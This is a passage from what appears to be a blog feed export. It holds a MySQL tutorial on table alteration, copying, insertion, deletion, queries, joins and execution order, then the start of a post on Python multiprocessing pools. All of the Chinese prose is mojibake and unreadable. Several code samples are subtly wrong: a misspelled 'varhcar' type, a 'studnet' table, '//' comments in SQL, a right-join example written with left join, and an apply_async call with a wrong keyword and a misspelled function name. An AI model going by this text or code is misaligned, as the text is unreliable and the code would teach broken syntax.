<li>ä¿®æ”¹å­—æ®µåï¼š</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> users change <span class="keyword">user</span> username varhcar(<span class="number">20</span>) <span class="keyword">not</span> <span class="keyword">null</span>;</span><br></pre></td></tr></table></figure>

<ul>
<li>åˆ é™¤å­—æ®µï¼š</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> users <span class="keyword">drop</span> email;</span><br></pre></td></tr></table></figure>

<ul>
<li>ä¿®æ”¹è¡¨åï¼š</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> users rename the_users;</span><br></pre></td></tr></table></figure>

<h3 id="å¤åˆ¶è¡¨"><a href="#å¤åˆ¶è¡¨" class="headerlink" title="å¤åˆ¶è¡¨"></a>å¤åˆ¶è¡¨</h3><p>åœ¨ä¸€å¼ å·²å­˜åœ¨çš„æ•°æ®è¡¨çš„åŸºç¡€ä¸Šåˆ›å»ºä¸€ä»½è¯¥è¡¨çš„å¤‡ä»½ï¼Œä¹Ÿå°±æ˜¯å¤åˆ¶è¡¨ï¼š</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> [if <span class="keyword">not</span> <span class="keyword">exists</span>] æ•°æ®è¡¨å <span class="keyword">like</span> æºæ•°æ®è¡¨å;</span><br></pre></td></tr></table></figure>

<p>ä½¿ç”¨è¯¥è¯­æ³•å¤åˆ¶æ•°æ®è¡¨æ—¶ï¼Œå°†åˆ›å»ºä¸€ä¸ªä¸æºæ•°æ®è¡¨ç›¸åŒç»“æ„çš„æ–°è¡¨ï¼Œè¯¥æ•°æ®è¡¨çš„åˆ«åã€æ•°æ®ç±»å‹å’Œç´¢å¼•éƒ½å°†è¢«å¤åˆ¶ï¼Œä½†æ˜¯è¡¨çš„å†…å®¹æ˜¯ä¸ä¼šè¢«å¤åˆ¶çš„ã€‚å› æ­¤ï¼Œåˆ›å»ºçš„è¡¨æ˜¯ä¸€å¼ <strong>ç©ºè¡¨</strong>:</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> if <span class="keyword">not</span> <span class="keyword">exists</span> <span class="keyword">user</span> <span class="keyword">like</span> the_users;</span><br></pre></td></tr></table></figure>

<p>å¦‚æœåœ¨å¤åˆ¶è¡¨æ ¼å¼çš„åŒæ—¶ä¹Ÿæƒ³å¤åˆ¶è¡¨ä¸­çš„å†…å®¹ï¼Œå¯ä»¥ä½¿ç”¨<code>as</code>ï¼ˆæŸ¥è¯¢è¡¨è¾¾å¼ï¼‰å­—å¥å®ç°ï¼š</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> if <span class="keyword">not</span> <span class="keyword">exists</span> <span class="keyword">user</span> <span class="keyword">as</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> the_users;</span><br></pre></td></tr></table></figure>

<h3 id="åˆ é™¤è¡¨"><a href="#åˆ é™¤è¡¨" class="headerlink" title="åˆ é™¤è¡¨"></a>åˆ é™¤è¡¨</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">drop</span> <span class="keyword">table</span> [if <span class="keyword">exists</span>] æ•°æ®è¡¨å;</span><br></pre></td></tr></table></figure>

<p>å¯åŒæ—¶åˆ é™¤å¤šå¼ è¡¨ï¼Œå¤šä¸ªè¡¨ä¹‹é—´ç”¨é€—å·<code>,</code>è¿æ¥ã€‚</p>
<h3 id="æ’å…¥æ•°æ®"><a href="#æ’å…¥æ•°æ®" class="headerlink" title="æ’å…¥æ•°æ®"></a>æ’å…¥æ•°æ®</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">insert</span> [low_priority <span class="operator">|</span> delayed <span class="operator">|</span> high_priority] [ignore]</span><br><span class="line">[<span class="keyword">into</span>] æ•°æ®è¡¨å [(å­—æ®µå)] <span class="keyword">values</span> (&#123;å€¼ <span class="operator">|</span> <span class="keyword">default</span>&#125;),(...),...</span><br></pre></td></tr></table></figure>

<ul>
<li><p>[low_priority | delayed | high_priority]ï¼š<code>low_priority</code> æ˜¯ <code>insert</code>ã€<code>delete</code>ã€<code>update</code> éƒ½å¯é€‰çš„æ“ä½œï¼Œé™ä½ <code>insert</code>ã€<code>delete</code>ã€<code>update</code> çš„ä¼˜å…ˆçº§ã€‚<code>delayed</code> æ˜¯ <code>insert</code> è¯­å¥æ”¯æŒçš„ä¸€ç§å¯é€‰ä¿®é¥°ç¬¦ï¼Œç”¨äºæŒ‡å®šMySQLæœåŠ¡å™¨æŠŠå¾…æ’å…¥çš„è¡Œæ•°æ®æ”¾åœ¨ä¸€ä¸ªç¼“å†²å™¨ä¸­ï¼Œç›´åˆ°å¾…æ’æ•°æ®çš„è¡¨ç©ºé—²æ—¶ï¼Œæ‰çœŸæ­£çš„åœ¨è¡¨ä¸­æ’å…¥æ•°æ®è¡Œã€‚<code>high_priority</code> æ˜¯ <code>insert</code>å’Œ <code>select</code> è¯­å¥æ”¯æŒçš„ä¸€ç§å¯é€‰ä¿®é¥°ç¬¦ï¼Œç”¨äºæŒ‡å®š <code>insert</code> å’Œ <code>select</code> æ“ä½œä¼˜å…ˆæ‰§è¡Œã€‚</p>
</li>
<li><p>[ignore]ï¼š åœ¨æ‰§è¡Œ <code>insert</code> è¯­å¥æ—¶ï¼Œæ‰€å‡ºç°çš„é”™è¯¯éƒ½ä¼šè¢«å½“åšè­¦å‘Š</p>
</li>
<li><p>[into]ï¼š æŒ‡å®šè¢«æ“ä½œçš„æ•°æ®è¡¨</p>
</li>
<li><p>[(å­—æ®µå,â€¦)]ï¼š å½“ä¸æŒ‡å®šè¯¥é€‰é¡¹æ—¶ï¼Œè¡¨ç¤ºè¦å‘è¡¨ä¸­æ‰€æœ‰åˆ—æ’å…¥æ•°æ®ï¼Œå¦åˆ™è¡¨ç¤ºå‘æ•°æ®è¡¨çš„æŒ‡å®šåˆ—æ’å…¥æ•°æ®ã€‚</p>
</li>
<li><p>({å€¼ | default}),(â€¦),â€¦ï¼šç”¨äºæŒ‡å®šéœ€è¦æ’å…¥çš„æ•°æ®æ¸…å•ï¼Œå…¶<strong>é¡ºåºå¿…é¡»ä¸å­—æ®µçš„é¡ºåºç›¸å¯¹åº”</strong>ã€‚å…¶ä¸­çš„æ¯ä¸€åˆ—çš„æ•°æ®å¯ä»¥æ˜¯ä¸€ä¸ªå˜é‡ã€å¸¸é‡ã€è¡¨è¾¾å¼æˆ–è€…nullã€‚ä½†æ˜¯å…¶<strong>æ•°æ®ç±»å‹è¦ä¸å¯¹åº”çš„å­—æ®µç±»å‹ç›¸åŒ¹é…</strong>ï¼›ä¹Ÿå¯ä»¥ä½¿ç”¨ <code>default</code> å…³é”®å­—ï¼Œè¡¨ç¤ºä¸ºè¯¥åˆ—æ’å…¥é»˜è®¤å€¼ï¼Œä½†æ˜¯å‰ææ˜¯å·²ç»æ˜ç¡®æŒ‡å®šäº†é»˜è®¤å€¼ï¼Œå¦åˆ™ä¼šå‡ºé”™ã€‚</p>
</li>
<li><p>æ’å…¥å®Œæ•´æ•°æ®ï¼š</p>
</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> users <span class="keyword">values</span> (<span class="number">1</span>, <span class="string">&#x27;qiuyue&#x27;</span>, <span class="number">19</span>);</span><br></pre></td></tr></table></figure>

<ul>
<li>æ’å…¥æ•°æ®è®°å½•çš„ä¸€éƒ¨åˆ†ï¼š</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> users (name, age) <span class="keyword">values</span> (<span class="string">&#x27;qiuyue&#x27;</span>, <span class="number">19</span>);</span><br></pre></td></tr></table></figure>

<ul>
<li>æ’å…¥æŸ¥è¯¢ç»“æœï¼šMySQL æ”¯æŒå°†æŸ¥è¯¢ç»“æœæ’å…¥åˆ°æ•°æ®è¡¨ä¸­</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> æ•°æ®è¡¨å[(å­—æ®µå,...)] <span class="keyword">select</span> ...;</span><br></pre></td></tr></table></figure>

<p><strong>select å­—å¥è¿”å›çš„ç»“æœé›†ä¸­çš„å­—æ®µæ•°é‡ã€å­—æ®µç±»å‹å¿…é¡»ä¸ç›®æ ‡æ•°æ®è¡¨å®Œå…¨ä¸€è‡´ã€‚</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> users (username,age) <span class="keyword">select</span> username,age <span class="keyword">from</span> students;</span><br></pre></td></tr></table></figure>

<h3 id="ä¿®æ”¹æ•°æ®"><a href="#ä¿®æ”¹æ•°æ®" class="headerlink" title="ä¿®æ”¹æ•°æ®"></a>ä¿®æ”¹æ•°æ®</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">update æ•°æ®è¡¨å</span><br><span class="line"><span class="keyword">set</span> å­—æ®µ<span class="number">1</span><span class="operator">=</span>å€¼<span class="number">1</span>[,å­—æ®µ<span class="number">2</span><span class="operator">=</span>å€¼<span class="number">2</span> ...]</span><br><span class="line">[<span class="keyword">where</span> æ¡ä»¶è¡¨è¾¾å¼] [<span class="keyword">order</span> by...] [limit è¡Œæ•°]</span><br></pre></td></tr></table></figure>

<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">update users <span class="keyword">set</span> username <span class="operator">=</span> <span class="string">&#x27;qiuyue&#x27;</span> <span class="keyword">where</span> id <span class="operator">=</span> <span class="number">1</span>;</span><br></pre></td></tr></table></figure>

<h3 id="åˆ é™¤æ•°æ®"><a href="#åˆ é™¤æ•°æ®" class="headerlink" title="åˆ é™¤æ•°æ®"></a>åˆ é™¤æ•°æ®</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">delete</span> <span class="keyword">from</span> æ•°æ®è¡¨å</span><br><span class="line">[<span class="keyword">where</span> æ¡ä»¶è¡¨è¾¾å¼] [<span class="keyword">order</span> by...] [limit è¡Œæ•°];</span><br></pre></td></tr></table></figure>

<p><strong>å¦‚æœæ²¡æœ‰æŒ‡å®š <code>where</code> æ¡ä»¶ï¼Œå°†åˆ é™¤æ‰€æœ‰è®°å½•</strong>ã€‚  </p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">delete</span> <span class="keyword">from</span> users <span class="keyword">where</span> id <span class="operator">=</span> <span class="number">2</span>;</span><br></pre></td></tr></table></figure>

<p>å¦‚æœè¦åˆ é™¤æ‰€æœ‰è¡Œï¼Œè¿˜å¯ä»¥ä½¿ç”¨ <code>truncate table</code> è¯­å¥ï¼š</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">truncate</span> [<span class="keyword">table</span>] æ•°æ®è¡¨å</span><br></pre></td></tr></table></figure>

<p><code>truncate</code> ä¼š<strong>åˆ é™¤æ•°æ®è¡¨ä¸­æ‰€æœ‰æ•°æ®ä¸”æ— æ³•æ¢å¤</strong>ã€‚<br><code>delete</code> ä¸ <code>truncate</code> åŒºåˆ«å¦‚ä¸‹ï¼š</p>
<ol>
<li>ä½¿ç”¨ <code>truncate</code> è¯­å¥ä¼šé‡æ–°è®¾ç½® <code>auto_increment</code> è®¡æ•°å™¨çš„åˆå§‹å€¼</li>
<li>å¯¹äºå‚ä¸äº†ç´¢å¼•å’Œè§†å›¾çš„è¡¨ä¸èƒ½ä½¿ç”¨ <code>truncate</code> è¯­å¥</li>
<li><code>truncate</code> æ¯” <code>delete</code> ä½¿ç”¨çš„ç³»ç»Ÿå’Œäº‹ç‰©èµ„æºå°‘ã€‚æ¯åˆ é™¤ä¸€æ¡è®°å½• <code>delete</code> è¯­å¥éƒ½ä¼šæ·»åŠ ä¸€æ¡æ—¥å¿—ï¼Œè€Œ <code>truncate</code> åªåœ¨äº‹ç‰©æ—¥å¿—ä¸­è®°å½•é¡µçš„é‡Šæ”¾ã€‚</li>
</ol>
<h3 id="æŸ¥è¯¢æ•°æ®"><a href="#æŸ¥è¯¢æ•°æ®" class="headerlink" title="æŸ¥è¯¢æ•°æ®"></a>æŸ¥è¯¢æ•°æ®</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> selection_list</span><br><span class="line"><span class="keyword">from</span> æ•°æ®è¡¨å</span><br><span class="line"><span class="keyword">where</span> primary_constraint</span><br><span class="line"><span class="keyword">order</span> <span class="keyword">by</span> sroting_cloumns </span><br><span class="line"><span class="keyword">having</span> secondary_constraint</span><br><span class="line">limit count </span><br></pre></td></tr></table></figure>

<ul>
<li>æŸ¥è¯¢ä¸€å¼ è¡¨çš„ä¸€åˆ—æˆ–å¤šåˆ—ï¼š</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users; <span class="operator">/</span><span class="operator">/</span>æŸ¥è¯¢usersè¡¨æ‰€æœ‰å†…å®¹</span><br><span class="line"><span class="keyword">select</span> id,age <span class="keyword">from</span> users; <span class="operator">/</span><span class="operator">/</span>æŸ¥è¯¢usersè¡¨idåˆ—å’Œageåˆ—æ‰€æœ‰å†…å®¹</span><br></pre></td></tr></table></figure>

<ul>
<li>ä»å¤šä¸ªè¡¨ä¸­è·å–æ•°æ®ï¼š</li>
</ul>
<p>ä½¿ç”¨ <code>select</code> è¯­å¥è¿›è¡Œå¤šè¡¨æŸ¥è¯¢ï¼Œéœ€è¦ç¡®å®šæ‰€æŸ¥è¯¢çš„æ•°æ®åœ¨å“ªä¸ªè¡¨ä¸­ï¼Œå¤šä¸ªè¡¨ä¹‹é—´ç”¨ <code>,</code>åˆ†éš”ï¼š</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> users.id, users.name, student.id, student.name</span><br><span class="line"><span class="keyword">from</span> users, student;</span><br></pre></td></tr></table></figure>

<p>è¿˜å¯ä»¥åœ¨ <code>where</code> å­å¥ä¸­ç”¨è¿æ¥ç¬¦ <code>=</code> æ¥ç¡®å®šè¡¨ä¹‹é—´çš„è”ç³»ã€‚ç„¶åæ ¹æ®è¿™ä¸ªæ¡ä»¶è¿”å›æŸ¥è¯¢ç»“æœï¼š</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> users.name,student.location <span class="keyword">from</span> users,studnet <span class="keyword">where</span> users.id<span class="operator">=</span>student.id <span class="keyword">and</span> users.id<span class="operator">=</span><span class="number">1</span>;</span><br></pre></td></tr></table></figure>

<p><code>users.id=student.id</code> è¡¨ç¤ºå°† users å’Œ student ä¸¤å¼ è¡¨æ ¹æ® <code>users.id=stduent.id</code> çš„æ¡ä»¶è¿æ¥èµ·æ¥ï¼Œå«åšç­‰åŒè¿æ¥ã€‚å¦‚æœä¸ä½¿ç”¨ <code>users.id=stduent.id</code> é‚£ä¹ˆäº§ç”Ÿçš„ç»“æœæ˜¯ä¸¤å¼ è¡¨çš„ç¬›å¡å°”ç§¯ï¼Œå«å…¨è¿æ¥ã€‚</p>
<ul>
<li>å¸¦å…³é”®å­— in çš„æŸ¥è¯¢ï¼š</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> å­—æ®µ <span class="keyword">from</span> è¡¨å <span class="keyword">where</span> å­—æ®µ [<span class="keyword">not</span>] <span class="keyword">in</span> (å…ƒç´ <span class="number">1</span>ï¼Œå…ƒç´ <span class="number">2</span> ...);</span><br></pre></td></tr></table></figure>

<p>å…³é”®å­— <code>in</code> å¯ä»¥åˆ¤æ–­æŸä¸ªå­—æ®µçš„å€¼æ˜¯å¦åœ¨æŒ‡å®šçš„é›†åˆä¸­ï¼Œå¦‚æœåœ¨è¯¥è®°å½•ä¼šè¢«æŸ¥è¯¢å‡ºæ¥ï¼š</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> name,age <span class="keyword">from</span> users <span class="keyword">where</span> name <span class="keyword">in</span> (<span class="string">&#x27;Mike&#x27;</span>, <span class="string">&#x27;David&#x27;</span>); </span><br></pre></td></tr></table></figure>

<ul>
<li>å¸¦å…³é”®å­—betweenâ€¦andâ€¦çš„èŒƒå›´æŸ¥è¯¢ï¼šbetweenâ€¦andâ€¦ æ˜¯<strong>å‰é—­åé—­</strong>çš„</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id <span class="keyword">between</span> <span class="number">2</span> <span class="keyword">and</span> <span class="number">7</span>;</span><br></pre></td></tr></table></figure>

<ul>
<li>å¸¦likeçš„å­—ç¬¦åŒ¹é…æŸ¥è¯¢ï¼šé€šè¿‡ <code>like</code> å¯ä»¥å®ç°æ¨¡ç³ŠæŸ¥è¯¢ï¼Œå®ƒæœ‰ä¸¤ç§é€šé…ç¬¦ <code>%</code> å’Œ <code>_</code>:<ul>
<li>% å¯ä»¥åŒ¹é… 0 ä¸ªæˆ–å¤šä¸ªå­—ç¬¦ï¼Œå¯ä»¥ä»£è¡¨ä»»æ„é•¿åº¦çš„å­—ç¬¦ä¸²ã€‚å¦‚ â€œMi%keâ€ å¯ä»¥åŒ¹é…Mikeï¼ŒMiosfkeç­‰</li>
<li>_ æœ€å¤šåªèƒ½åŒ¹é…ä¸€ä¸ªå­—ç¬¦ã€‚</li>
</ul>
</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> student <span class="keyword">where</span> name <span class="keyword">like</span> &quot;Jack_a&quot;;</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> studnet <span class="keyword">where</span> location <span class="keyword">like</span> &quot;China\_%&quot;;</span><br></pre></td></tr></table></figure>

<ul>
<li>group by åˆ†ç»„æŸ¥è¯¢</li>
</ul>
<p>é€šè¿‡å…³é”®å­— <code>group by</code> å¯ä»¥å°†æ•°æ®åˆ’åˆ†åˆ°ä¸åŒçš„ç»„ä¸­ï¼Œå®ç°å¯¹è®°å½•çš„åˆ†ç»„æŸ¥è¯¢ã€‚å¸¸æ­é… count(), sum(), avg(), max(), min() ç­‰èšåˆå‡½æ•°ä½¿ç”¨</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> class_id <span class="keyword">from</span> students <span class="keyword">group</span> <span class="keyword">by</span> class_id;</span><br><span class="line"><span class="keyword">select</span> class_id, <span class="built_in">count</span>(<span class="operator">*</span>) <span class="keyword">from</span> students <span class="keyword">group</span> <span class="keyword">by</span> class_id;</span><br></pre></td></tr></table></figure>

<h3 id="è¿æ¥æŸ¥è¯¢"><a href="#è¿æ¥æŸ¥è¯¢" class="headerlink" title="è¿æ¥æŸ¥è¯¢"></a>è¿æ¥æŸ¥è¯¢</h3><p>è¿æ¥æ˜¯æŠŠä¸åŒè¡¨çš„è®°å½•è¿æ¥åœ¨ä¸€èµ·çš„æœ€æ™®éçš„æ–¹æ³•ã€‚</p>
<ul>
<li>å†…è¿æ¥æŸ¥è¯¢ï¼šæŠŠä¸ç¬¦åˆè¿æ¥æ¡ä»¶çš„è¡Œä»è§†å›¾ä¸­åˆ é™¤ï¼Œæœ€å¸¸è§çš„ä¾‹å­æ˜¯ç›¸ç­‰æŸ¥è¯¢ï¼š</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> s.name,s.age,s.class_id,c.name <span class="keyword">as</span> class_name </span><br><span class="line"><span class="keyword">from</span> students <span class="keyword">as</span> s</span><br><span class="line"><span class="keyword">join</span> classes <span class="keyword">as</span> c</span><br><span class="line"><span class="keyword">on</span> s.class_id <span class="operator">=</span> c.id <span class="keyword">and</span> s.id <span class="operator">&gt;</span> <span class="number">5</span>;</span><br></pre></td></tr></table></figure>

<ul>
<li>å·¦å¤–è¿æ¥ï¼šè¿”å›ç»“æœé™¤äº†å†…è¿æ¥çš„æ•°æ®å¤–ï¼Œè¿˜åŒ…æ‹¬å·¦è¡¨ä¸­ä¸ç¬¦åˆæ¡ä»¶çš„æ•°æ®ï¼Œå¹¶åœ¨å³è¡¨ç›¸åº”åˆ—åŠ  null å€¼</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> å­—æ®µ <span class="keyword">from</span> å·¦è¡¨å <span class="keyword">left</span> <span class="keyword">join</span> å³è¡¨å <span class="keyword">on</span> æ¡ä»¶;</span><br></pre></td></tr></table></figure>

<ul>
<li>å³å¤–è¿æ¥ï¼šè¿”å›ç»“æœé™¤äº†å†…è¿æ¥çš„æ•°æ®å¤–ï¼Œè¿˜åŒ…æ‹¬å³è¡¨ä¸­ä¸ç¬¦åˆæ¡ä»¶çš„æ•°æ®ï¼Œå¹¶åœ¨å·¦è¡¨ç›¸åº”åˆ—åŠ  null å€¼</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> å­—æ®µ <span class="keyword">from</span> å·¦è¡¨å <span class="keyword">left</span> <span class="keyword">join</span> å³è¡¨å <span class="keyword">on</span> æ¡ä»¶;</span><br></pre></td></tr></table></figure>

<h1 id="è¯­å¥æ‰§è¡Œé¡ºåº"><a href="#è¯­å¥æ‰§è¡Œé¡ºåº" class="headerlink" title="è¯­å¥æ‰§è¡Œé¡ºåº"></a>è¯­å¥æ‰§è¡Œé¡ºåº</h1><p>MySQLçš„è¯­å¥ä¸€å…±åˆ†ä¸º11æ­¥ï¼Œå¦‚ä¸‹å›¾æ‰€æ ‡æ³¨çš„é‚£æ ·ï¼Œæœ€å…ˆæ‰§è¡Œçš„æ€»æ˜¯FROMæ“ä½œï¼Œæœ€åæ‰§è¡Œçš„æ˜¯LIMITæ“ä½œã€‚å…¶ä¸­æ¯ä¸€ä¸ªæ“ä½œéƒ½ä¼šäº§ç”Ÿä¸€å¼ è™šæ‹Ÿçš„è¡¨ï¼Œè¿™ä¸ªè™šæ‹Ÿçš„è¡¨ä½œä¸ºä¸€ä¸ªå¤„ç†çš„è¾“å…¥ï¼Œåªæ˜¯è¿™äº›è™šæ‹Ÿçš„è¡¨å¯¹ç”¨æˆ·æ¥è¯´æ˜¯é€æ˜çš„ï¼Œä½†æ˜¯åªæœ‰æœ€åä¸€ä¸ªè™šæ‹Ÿçš„è¡¨æ‰ä¼šè¢«ä½œä¸ºç»“æœè¿”å›ã€‚å¦‚æœæ²¡æœ‰åœ¨è¯­å¥ä¸­æŒ‡å®šæŸä¸€ä¸ªå­å¥ï¼Œé‚£ä¹ˆå°†ä¼šè·³è¿‡ç›¸åº”çš„æ­¥éª¤ã€‚  </p>
<p><img src="https://i.loli.net/2019/02/24/5c720eb160e17.jpg" alt="æ‰§è¡Œé¡ºåº">  </p>
<p>ä¸‹é¢æ¥åˆ†æä¸€ä¸‹è¿™äº›è¯­å¥ï¼š  </p>
<ol>
<li>FORM: å¯¹FROMçš„å·¦è¾¹çš„è¡¨å’Œå³è¾¹çš„è¡¨è®¡ç®—ç¬›å¡å°”ç§¯ã€‚äº§ç”Ÿè™šè¡¨VT1</li>
<li>ON: å¯¹è™šè¡¨VT1è¿›è¡ŒONç­›é€‰ï¼Œåªæœ‰é‚£äº›ç¬¦åˆ <join-condition> çš„è¡Œæ‰ä¼šè¢«è®°å½•åœ¨è™šè¡¨VT2ä¸­ã€‚</li>
<li>JOINï¼š å¦‚æœæŒ‡å®šäº†OUTER JOINï¼ˆæ¯”å¦‚left joinã€ right joinï¼‰ï¼Œé‚£ä¹ˆä¿ç•™è¡¨ä¸­æœªåŒ¹é…çš„è¡Œå°±ä¼šä½œä¸ºå¤–éƒ¨è¡Œæ·»åŠ åˆ°è™šæ‹Ÿè¡¨VT2ä¸­ï¼Œäº§ç”Ÿè™šæ‹Ÿè¡¨VT3,å¦‚æœfromå­å¥ä¸­åŒ…å«ä¸¤ä¸ªä»¥ä¸Šçš„è¡¨çš„è¯ï¼Œé‚£ä¹ˆå°±ä¼šå¯¹ä¸Šä¸€ä¸ªjoinè¿æ¥äº§ç”Ÿçš„ç»“æœVT3å’Œä¸‹ä¸€ä¸ªè¡¨é‡å¤æ‰§è¡Œæ­¥éª¤1~3è¿™ä¸‰ä¸ªæ­¥éª¤ï¼Œä¸€ç›´åˆ°å¤„ç†å®Œæ‰€æœ‰çš„è¡¨ä¸ºæ­¢ã€‚</li>
<li>WHEREï¼š å¯¹è™šæ‹Ÿè¡¨VT3è¿›è¡ŒWHEREæ¡ä»¶è¿‡æ»¤ã€‚åªæœ‰ç¬¦åˆ <where-condition> çš„è®°å½•æ‰ä¼šè¢«æ’å…¥åˆ°è™šæ‹Ÿè¡¨VT4ä¸­ã€‚</li>
<li>GROUP BY: æ ¹æ®group byå­å¥ä¸­çš„åˆ—ï¼Œå¯¹VT4ä¸­çš„è®°å½•è¿›è¡Œåˆ†ç»„æ“ä½œï¼Œäº§ç”ŸVT5.</li>
<li>CUBE | ROLLUP: å¯¹è¡¨VT5è¿›è¡Œcubeæˆ–è€…rollupæ“ä½œï¼Œäº§ç”Ÿè¡¨VT6.</li>
<li>HAVINGï¼š å¯¹è™šæ‹Ÿè¡¨VT6åº”ç”¨havingè¿‡æ»¤ï¼Œåªæœ‰ç¬¦åˆ <having-condition> çš„è®°å½•æ‰ä¼šè¢« æ’å…¥åˆ°è™šæ‹Ÿè¡¨VT7ä¸­ã€‚</li>
<li>SELECTï¼š æ‰§è¡Œselectæ“ä½œï¼Œé€‰æ‹©æŒ‡å®šçš„åˆ—ï¼Œæ’å…¥åˆ°è™šæ‹Ÿè¡¨VT8ä¸­ã€‚</li>
<li> DISTINCTï¼š å¯¹VT8ä¸­çš„è®°å½•è¿›è¡Œå»é‡ã€‚äº§ç”Ÿè™šæ‹Ÿè¡¨VT9.</li>
<li>ORDER BY: å°†è™šæ‹Ÿè¡¨VT9ä¸­çš„è®°å½•æŒ‰ç…§ <order_by_list> è¿›è¡Œæ’åºæ“ä½œï¼Œäº§ç”Ÿè™šæ‹Ÿè¡¨VT10.</li>
<li>LIMITï¼šå–å‡ºæŒ‡å®šè¡Œçš„è®°å½•ï¼Œäº§ç”Ÿè™šæ‹Ÿè¡¨VT11, å¹¶å°†ç»“æœè¿”å›ã€‚  </li>
</ol>
]]></content>
      <categories>
        <category>æ•°æ®åº“</category>
      </categories>
      <tags>
        <tag>MySQL</tag>
      </tags>
  </entry>
  <entry>
    <title>è¿›ç¨‹é—´é€šä¿¡â€”â€”ä»¥Pythonä¸ºä¾‹</title>
    <url>/2018/01/09/%E8%BF%9B%E7%A8%8B%E4%B8%8E%E7%BA%BF%E7%A8%8B/</url>
    <content><![CDATA[<p>éœ€è¦åˆ›å»ºå¤šä¸ªè¿›ç¨‹æ—¶ï¼Œå¯ä»¥ä½¿ç”¨ multiprocessing ä¸­çš„ Pool ç±»å¼€è¿›ç¨‹æ± ã€‚Pool() é»˜è®¤å¼€å¯æ•°é‡ç­‰äºå½“å‰ cpu æ ¸å¿ƒæ•°çš„å­è¿›ç¨‹ï¼ˆå½“ç„¶å¯ä»¥æ‰‹åŠ¨æ”¹å˜ï¼‰</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> multiprocessing <span class="keyword">import</span> Pool</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hello</span>(<span class="params">i</span>):</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;hello ,this is the %d process&quot;</span> % i)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    p = Pool()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">5</span>):</span><br><span class="line">        p.apply_async(target=hell0,args=(i,))</span><br><span class="line">    p.close()</span><br><span class="line">    p.join()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>

<p>apply_async è¡¨ç¤ºåœ¨å¼€è¿›ç¨‹æ—¶ä¸é˜»å¡ä¸»è¿›ç¨‹ï¼Œæ˜¯å¼‚æ­¥ IO çš„ä¸€ç§æ–¹å¼ä¹‹ä¸€ã€‚targe å‚æ•°ä¼ å…¥è¦åœ¨å­çº¿ç¨‹ä¸­æ‰§è¡Œçš„<strong>å‡½æ•°å¯¹è±¡</strong>ï¼Œargsä»¥å…ƒç»„çš„æ–¹å¼ä¼ å…¥å‡½æ•°çš„å‚æ•°ã€‚<br>join() ä¼šç­‰å¾…çº¿ç¨‹æ± ä¸­çš„æ¯ä¸€ä¸ªçº¿ç¨‹æ‰§è¡Œå®Œæ¯•ï¼Œåœ¨ join() ä¹‹å‰å¿…é¡»è¦å…ˆ close()ï¼Œclose() è¡¨ç¤ºä¸èƒ½å†å‘çº¿ç¨‹æ± ä¸­æ·»åŠ æ–°çš„ process äº†ã€‚</p>
